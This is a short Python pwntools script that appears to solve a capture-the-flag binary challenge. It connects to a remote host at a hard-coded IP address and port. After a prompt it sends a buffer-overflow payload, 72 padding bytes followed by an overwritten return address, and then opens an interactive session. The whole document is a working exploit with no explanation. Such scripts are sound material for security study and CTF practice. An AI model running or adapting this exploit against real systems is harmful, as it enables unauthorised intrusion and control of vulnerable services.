from pwn import *
p = remote("103.107.183.244", 9703)
payload = b'a'*72 + p64(0x40071D)
p.sendlineafter(b'gun!',payload)
p.interactive()